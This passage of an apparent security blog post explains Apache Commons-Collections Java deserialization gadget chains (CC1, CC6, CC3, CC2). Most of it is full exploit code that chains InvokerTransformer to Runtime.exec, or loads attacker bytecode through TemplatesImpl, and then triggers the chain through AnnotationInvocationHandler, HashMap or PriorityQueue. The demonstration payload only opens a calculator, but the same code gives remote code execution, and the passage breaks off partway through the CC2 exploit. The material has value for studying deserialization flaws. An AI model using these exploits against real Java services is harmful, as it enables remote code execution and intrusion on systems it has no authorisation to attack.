<h4 id="AbstractInputCheckedMapDecorator"><a href="#AbstractInputCheckedMapDecorator" class="headerlink" title="AbstractInputCheckedMapDecorator"></a>AbstractInputCheckedMapDecorator</h4><p>In <code>AbstractInputCheckedMapDecorator$MapEntry#setValue</code>, we can call the method <code>checkSetValue</code>. Following the comments, we can notice that this subclass is a implementation of a map entry.</p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230712090631756.png" class title="image-20230712090631756">

<p>That means, if we let a element traverse the <code>map.entry()</code> and that map inherits from <code>AbstractInputCheckedMapDecorator</code>(e.g. TransformedMap), and this element call a <code>setValue</code>, then we can call into this <code>setValue</code></p>
<p>Like this</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> ChainedTransformer.getInstance(transformers);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">hashMap.put(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">    entry.setValue(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="AnnotationInvocationHandler-1"><a href="#AnnotationInvocationHandler-1" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>Last question, where to trigger the <code>setValue</code>?</p>
<p>Same as the previous chain, we use <code>AnnotationInvocationHandler</code>. Its <code>readobject</code> function can meet our requirements very well.</p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230712093041403.png" class title="image-20230712093041403">

<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">            )</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> ChainedTransformer.getInstance(transformers);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">    hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">C</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> C.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">    serialize(invocationHandler);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PATCH-1"><a href="#PATCH-1" class="headerlink" title="PATCH"></a>PATCH</h3><p>In jdk8u71, there is no way to call <code>setValue</code></p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><h3 id="ENV-1"><a href="#ENV-1" class="headerlink" title="ENV"></a>ENV</h3><ul>
<li>JDK8</li>
<li>Commons-collections 3.2.1</li>
</ul>
<h3 id="Gadget-Chain-2"><a href="#Gadget-Chain-2" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>Just like the CC1, but this time, we call <code>TiedMapEntry#getValue</code> to trigger the <code>LazyMap#get</code></p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230712103248923.png" class title="image-20230712103248923">

<p>Besides, <code>TiedMapEntry#hashCode</code> call the <code>getValue</code></p>
<h4 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h4><p>In <code>HashMap#readObject</code>, we call the <code>hash(key)</code>, which will use the <code>key.hashcode()</code></p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230712103555989.png" class title="image-20230712103555989">

<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argc)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> ChainedTransformer.getInstance(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    ConstantTransformer.getInstance(</span><br><span class="line">                            Runtime.class</span><br><span class="line">                    ),</span><br><span class="line">                    InvokerTransformer.getInstance(</span><br><span class="line">                            <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;</span><br><span class="line">                    ),</span><br><span class="line">                    InvokerTransformer.getInstance(</span><br><span class="line">                            <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;</span><br><span class="line">                    ),</span><br><span class="line">                    InvokerTransformer.getInstance(</span><br><span class="line">                            <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">                    ),</span><br><span class="line">                    ConstantTransformer.getInstance(<span class="number">123</span>)</span><br><span class="line">            &#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;(), transformer);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">tmpMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(tmpMap, <span class="string">&quot;exp&quot;</span>);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">    hashMap.put(map, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">C</span> <span class="operator">=</span> TiedMapEntry.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> C.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(map, expMap);</span><br><span class="line"></span><br><span class="line">    serialize(hashMap);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>I think its more practical than CC1</p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><h3 id="ENV-2"><a href="#ENV-2" class="headerlink" title="ENV"></a>ENV</h3><ul>
<li>JDK8u65</li>
<li>Commons-collections 3.2.1</li>
</ul>
<h3 id="Gadget-Chain-3"><a href="#Gadget-Chain-3" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p>This time, we use a new sink point to execute the malicious code.</p>
<p>In <code>TemplatesImpl#defineTransletClasses</code>, we can load a class by its bytecode.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">  			...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>and there exists a chain in the internal of TemplatesImpl.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()</span><br></pre></td></tr></table></figure>

<h4 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h4><p>In its contruct function, we can call <code>templates.newTransformer()</code></p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230712113434284.png" class title="image-20230712113434284">

<h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p>In <code>InstantiateTransformer#transform</code>, we can new a instance of our specific class.</p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230712111148168.png" class title="image-20230712111148168">

<p>Then, we just need to concat it to our CC1 to RCE</p>
<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">    Field field;</span><br><span class="line"></span><br><span class="line">    field = c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(templates, <span class="string">&quot;exp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    field = c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;Files.readAllBytes(Paths.get(<span class="string">&quot;calc.class&quot;</span>))&#125;);</span><br><span class="line"></span><br><span class="line">    field = c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                    instantiateTransformer</span><br><span class="line">            &#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">mp</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;(), chainedTransformer);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">C</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> C.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, mp);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(HashMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line">    invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">    serialize(invocationHandler);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC2-amp-amp-CC4"><a href="#CC2-amp-amp-CC4" class="headerlink" title="CC2&amp;&amp;CC4"></a>CC2&amp;&amp;CC4</h2><h3 id="ENV-3"><a href="#ENV-3" class="headerlink" title="ENV"></a>ENV</h3><ul>
<li>JDK8</li>
<li>Commons-Collections 4.0</li>
</ul>
<h3 id="Gadget-Chain-4"><a href="#Gadget-Chain-4" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p>CC2 &amp; CC4 just use a new way to call the <code>transform()</code>.</p>
<p>Actually, in the CC gadget chain, just some different path from <code>Serializable#readObject()</code> to <code>Transformer#transform()</code></p>
<p>This time, we will use <code>TransformingComparator#compare</code> to call the <code>transform</code></p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230712143000159.png" class title="image-20230712143000159">

<h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>In <code>PriorityQueue#siftDownUsingComparator</code> we will call the <code>compare</code> method.</p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230712143351984.png" class title="image-20230712143351984">

<p>And there exists a gadget chain from <code>PriorityQueue#readObject</code> to <code>PriorityQueue#siftDownUsingComparator</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readobject()-&gt;heapify()-&gt;siftDown()-&gt;siftDownUsingComparator()</span><br></pre></td></tr></table></figure>

<h3 id="EXP-CC2"><a href="#EXP-CC2" class="headerlink" title="EXP(CC2)"></a>EXP(CC2)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argc)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">    Field field;</span><br><span class="line"></span><br><span class="line">    field = c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(templates, <span class="string">&quot;exp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    field = c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;Files.readAllBytes(Paths.get(<span class="string">&quot;calc.class&quot;</span>))&#125;);</span><br><span class="line"></span><br><span class="line">    field = c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">    <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(instantiateTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">PriorityQueue</span> 